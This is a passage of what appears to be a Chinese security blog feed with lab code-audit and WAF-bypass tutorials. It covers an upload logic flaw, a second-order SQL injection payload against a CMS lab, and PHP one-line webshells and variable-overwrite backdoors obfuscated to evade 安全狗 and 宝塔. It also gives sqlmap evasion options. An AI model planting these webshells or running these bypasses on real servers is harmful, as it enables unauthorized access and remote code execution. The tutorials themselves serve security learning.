alt="image-20220614194116520"></p><p>在controllers文件夹下查找account.php文件下的upload方法，post传参，tx接收参数，然后用将空替换为+，赋值为file，file再使用正则表达式匹配规则匹配出合适的值将结果赋值给result；之后使用new_file接收文件地址，在这里没有任何过滤；下面的代码才是过滤。</p><p>代码中输出result[2]的值查看结果：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614195023626.png" alt="image-20220614195023626"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614195233953.png" alt="image-20220614195233953"></p><p>返回jpeg，证明result[2]存储的就是后缀名；</p><p>输出new_file值，图片路径：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614200319863.png" alt="image-20220614200319863"></p><h3 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h3><p>这里可以确定[0]是全部的数据，[1]是data，[2]是png（文件后缀名），[3]是base64</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614200415729.png" alt="image-20220614200415729"></p><h3 id="0x07-1"><a href="#0x07-1" class="headerlink" title="0x07"></a>0x07</h3><p>抓包直接上传文件返回1</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614194030003.png" alt="image-20220614194030003"></p><p>由于没有验证，修改后缀名上传：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614194425996.png" alt="image-20220614194425996"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614200520750.png" alt="image-20220614200520750"></p><p>可以看到上传成功。</p><h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>1、业务功能分析-&gt;会员中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断；</p><p>2、存在逻辑漏洞，即先上传，后验证。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-CMS靶场</title>
      <link href="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-骑士人才招聘系统-SQL注入挖掘"><a href="#0x00-骑士人才招聘系统-SQL注入挖掘" class="headerlink" title="0x00 骑士人才招聘系统-SQL注入挖掘"></a>0x00 骑士人才招聘系统-SQL注入挖掘</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：骑士人才招聘系统PHPCMS，3.4版本；</p><p>描述：源码自带过滤机制。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>使用seay源代码审计系统分析源码：<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612164004315.png" alt="image-20220612164004315"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>分析时需要找全局配置文件，一般全局配置文件就会又过滤机制；</p><p>一般全局配置文件则是需要其他问价加载时包含其中，达到过滤机制，因此查找是找到<code>inclde</code></p><p>、<code>common</code>、<code>function</code>这样的文件或者文件夹去查看代码；例如：</p><p>找到common.fun.php文件打开可以看到有过滤机制的代码：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612164626088.png" alt="image-20220612164626088"></p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612164850024.png" alt="image-20220612164850024"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>首先common.fun.php文件先会检查你的php环境魔术引号是否开启：<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612165252188.png" alt="image-20220612165252188"></p><p>如果没打开，就用addslashes过滤，在套用mystrip_tags过滤一次：<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612165345610.png" alt="image-20220612165345610"></p><p>addslashes()函数：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612165609948.png" alt="image-20220612165609948"></p><p>如果魔术引号开启，直接调用mystrip_tags()字符串进行过滤：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612170248480.png" alt="image-20220612170248480"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>如果魔术引号开启，这里就变成了绕过魔术引号的注入；</p><p>绕过魔术引号的的SQL注入：宽字节注入，二次注入；</p><p>这里采用二次注入可以绕过魔术引号的转义，因此需要找到insert和update字段的功能点，一般为注册和修改信息。</p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>点击会员中心创建新简历，随便填写信息保存下一步：<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612172304259.png" alt="image-20220612172304259"></p><p>从url来看，访问的文件夹路径是<code>/user/personal/personal_resume.php</code>：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612173748210.png" alt="image-20220612173748210"></p><p>利用seay插件mysql监控，找到resume字段可以看到就是刚才填写的信息，接着update字段不是我们自己更改的信息，因此这里使用二次注入的条件不能够满足，另找功能点。</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612173338683.png" alt="image-20220612173338683"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>随便填写保存下一步：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612174441337.png" alt="image-20220612174441337"></p><p>接着进行mysql监控查看信息，同样update还不是能够进行操作：（必须要update字段自己填写）<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612174639380.png" alt="image-20220612174639380"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>继续向下：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612174921365.png" alt="image-20220612174921365"></p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612174906915.png" alt="image-20220612174906915"></p><p>可以看到直接进行了update，但这里没有进行insert，不能实现二次注入。</p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>随便填写：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612180248993.png" alt="image-20220612180248993"></p><p>mysql监控，可以看到这里的update出现了可控的字段<code>xiao</code>：</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612180458903.png" alt="image-20220612180458903"></p><p>测试字符是否能被通过：<br><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612180833632.png" alt="image-20220612180833632"></p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612181004203.png" alt="image-20220612181004203"></p><pre class="line-numbers language-none"><code class="language-none">insert字段：INSERT INTO resume_education (&#96;uid&#96;, &#96;pid&#96;, &#96;start&#96;, &#96;endtime&#96;, &#96;school&#96;, &#96;speciality&#96;, &#96;education&#96;, &#96;education_cn&#96;) VALUES (&#39;1&#39;, &#39;1&#39;, &#39;2013\xC4\xEA1\xD4\xC2&#39;, &#39;2014\xC4\xEA2\xD4\xC2&#39;, &#39;a\&#39;&#39;, &#39;xiao&#39;, &#39;68&#39;, &#39;\xD6\xD0ר&#39;)update字段：UPDATE resume SET &#96;photo&#96;&#x3D;&#39;0&#39;, &#96;complete&#96;&#x3D;&#39;1&#39;, &#96;complete_percent&#96;&#x3D;&#39;60&#39;, &#96;key&#96;&#x3D;&#39;a&#39; \xCF\xEEĿ\xBE\xAD\xC0\xED&#x2F;\xB2\xFAƷ\xBE\xAD\xC0\xED xxxx00  \xCF\xEEĿ00 \xCF\xEEĿ\xBE\xAD\xC0\xED \xBE\xAD\xC0\xED00 \xB2\xFAƷ00 \xB2\xFAƷ\xBE\xAD\xC0\xED \xB8\xDF\xD6\xD000 xiao&#39;, &#96;refreshtime&#96;&#x3D;&#39;1655028523&#39; WHERE uid&#x3D;&#39;1&#39; AND id&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到insert字段中a的单引号被转义为<code>\</code>，而update中a值正常，这就体现了二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>插入payload：</p><pre class="line-numbers language-none"><code class="language-none">aa&#39;,&#39;fullname&#39;&#x3D;user()#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612191534728.png" alt="image-20220612191534728"></p><p>查看简历，可以看到姓名变成了root@localhost，后续可以继续进行其他的绕过读取用户数据。</p><p><img src="/2022/06/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-CMS%E9%9D%B6%E5%9C%BA/image-20220612191557721.png" alt="image-20220612191557721"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计--PHP无框架项目SQL注入挖掘技巧</title>
      <link href="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/"/>
      <url>/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h2 id="0x01-使用Fortify进行代码审计"><a href="#0x01-使用Fortify进行代码审计" class="headerlink" title="0x01 使用Fortify进行代码审计"></a>0x01 使用Fortify进行代码审计</h2><p>使用sql靶场源代码为例，颜色代表漏洞危害等级，也可调试代码，可以为繁琐的手工审计节省出大量时间。</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611221843613.png" alt="image-20220611221843613"></p><h2 id="0x02-定点挖掘"><a href="#0x02-定点挖掘" class="headerlink" title="0x02 定点挖掘"></a>0x02 定点挖掘</h2><h3 id="0x00-关键字"><a href="#0x00-关键字" class="headerlink" title="0x00 关键字"></a>0x00 关键字</h3><p>通过搜索特定关键字尝试寻找特定漏洞，如“select”“insert”“update”等与SQL漏洞自身相关的关键字，或者与变量，特定函数相关的关键字。</p><h3 id="0x01-功能点"><a href="#0x01-功能点" class="headerlink" title="0x01 功能点"></a>0x01 功能点</h3><p>漏洞依靠特定函数实现，而特定函数一般用于实现相关功能。寻找相关功能点，抓包分析找到源码中特定的文件代码段，进行代码分析。</p><p>例如文件上传漏洞，若存在上传的地址，之后通过上传的功能代码进行漏洞挖掘；sql注入也是同理，代码审计时候需要找到和数据库交互的代码段进行测试。</p><h3 id="0x02-拓展"><a href="#0x02-拓展" class="headerlink" title="0x02 拓展"></a>0x02 拓展</h3><p>例如：sql注入</p><p>1、数据库监控：监控当前页面和数据库交互的过程，即SQL语句的执行，适用于SQL注入；</p><p>2、断点调试：访问页面对应代码进行断点调试，了解代码执行的前后顺序，调用的文件列表等。</p><h2 id="0x03-sqqyw源码审计"><a href="#0x03-sqqyw源码审计" class="headerlink" title="0x03 sqqyw源码审计"></a>0x03 sqqyw源码审计</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>将源文件加载到工具当中：</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225221494.png" alt="image-20220611225221494"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>搜索特定关键字，如：select，where等；</p><p>全局搜索select：<br><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225417110.png" alt="image-20220611225417110"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开其中一个发现编码有问题更改编码：</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225457398.png" alt="image-20220611225457398"></p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225608673.png" alt="image-20220611225608673"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p> 之后对参数点，功能点进行追踪分析是否存在SQL注入漏洞；若存在注入点利用SQL注入的思路进行SQL注入。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过-权限控制</title>
      <link href="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
      <url>/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.png" alt="WAF绕过-权限控制"></p><h2 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h2><p>一句话木马，用eval()函数将字符串转换为PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @ev删掉这串汉字<span class="token function">al</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘chop删掉这串汉字per’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用ass删掉这串汉字ert代替eval()：</p><p>（eval()会被检测）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> ass删掉这串汉字<span class="token function">ert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘chopper’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>变量覆盖，覆盖原始变量，安全狗追踪变量时无法找到变量b的出处：</p><p>后门代码：绕过安全狗</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘x’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘y’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>这里利用参数传递变量：$a接收x值b，而此时的b就是下面的$b,$a又接收y值assert,此时x值=y值，也就是$b=assert()；实现绕过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用代码时传参：?x&#x3D;b&amp;y&#x3D;assert Post data：z&#x3D;需要执行的命令</p><p>使用base64加密传输命令，<strong>绕过宝塔</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘x’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘y’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token function">base64_decode</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 由于输入的z值可能会被宝塔检测到，例如：phpinfo()这样的函数，因此使用base64加密方式去绕过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-加密混淆"><a href="#0x02-加密混淆" class="headerlink" title="0x02 加密混淆"></a>0x02 加密混淆</h2><p>用enphp加密来绕过检测：</p><p>一句话木马：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">base64_decode</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在enphp的文件夹中打开cmd，执行“php.exe code_test.php”，可以通过“func_v2.php”来调整参数，程序会自动把“code_test”文件夹下的文件加密，加密结果生成在“encoded”文件夹下。</p><p><strong>原理：由于加密程度越高，越容易混淆，加密过于复杂，WAF在检测时候无法解密出原始代码，实现绕过。</strong></p><p>PHP在线加密：</p><p><a href="https://www.phpjiami.com/phpjiami.html">https://www.phpjiami.com/phpjiami.html</a> </p><h2 id="0x03-工具连接带有编码解码绕过的一句话"><a href="#0x03-工具连接带有编码解码绕过的一句话" class="headerlink" title="0x03 工具连接带有编码解码绕过的一句话"></a>0x03 工具连接带有编码解码绕过的一句话</h2><p>1、蚁剑，选中对应地址，右键“添加数据”，编码器选择对应的加密方式</p><p>2、菜刀，无此功能</p><p>3、冰蝎，双向加密传输</p><p>冰蝎双向加密传输图解：</p><p><img src="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/image-20220611120451633.png" alt="image-20220611120451633"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过-漏洞利用之注入上传跨站等绕过</title>
      <link href="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/"/>
      <url>/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" alt="WAF绕过-漏洞利用"></p><h2 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h2><p>使用如sqlmap等工具注入时，为防止CC拦截，修改数据包us头模仿爬虫，或使用代理池</p><p>安全狗：参考之前payload</p><p>Aliyun：基本修改指纹即可</p><p>宝塔：匹配关键字，包括“&#x2F;*”，注入语句的每个“&#x2F;*”都改为“%00&#x2F;*”（利用了00截断）</p><p>sqlmap使用语句：sqlmap –proxy&#x3D;”<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a>“ –tamper&#x3D;”waf.py” –random-agent</p><p>sqlmap也可以用“–user-agent”指定ua</p><p><strong>（WAF有检测各种注入工具的请求头，因此要修改UA）</strong></p><h2 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h2><p>截断，参考之前文件上传waf绕过payload。</p><h2 id="0x03-XSS跨站"><a href="#0x03-XSS跨站" class="headerlink" title="0x03 XSS跨站"></a>0x03 XSS跨站</h2><p>利用XSStrike绕过，加上“–timeout”或“–proxy”绕过CC。</p><h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><p>1、加解密：尝试用base64、ASCII码等可逆的加密绕过；</p><p>2、替换：在数据中插入某字符，同时加入将该字符替换为空的函数；</p><p>3、利用变量覆盖或者把函数拆开然后用参数拼接（CTF常考）；</p><p>4、base64不行就用ASCII码，加解密不行就用替换，GET不行就用REQUEST；</p><h2 id="0x05-文件包含"><a href="#0x05-文件包含" class="headerlink" title="0x05 文件包含"></a>0x05 文件包含</h2><p>符号变异，“\”“&#x2F;”</p><h2 id="0x06-逻辑漏洞"><a href="#0x06-逻辑漏洞" class="headerlink" title="0x06 逻辑漏洞"></a>0x06 逻辑漏洞</h2><p>逻辑越权类的漏洞WAF不容易检测，也不容易拦截，一般不需要绕过WAF，基本不受WAF影响。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过-漏洞发现之代理池指纹被动探针</title>
      <link href="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/"/>
      <url>/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/</url>
      
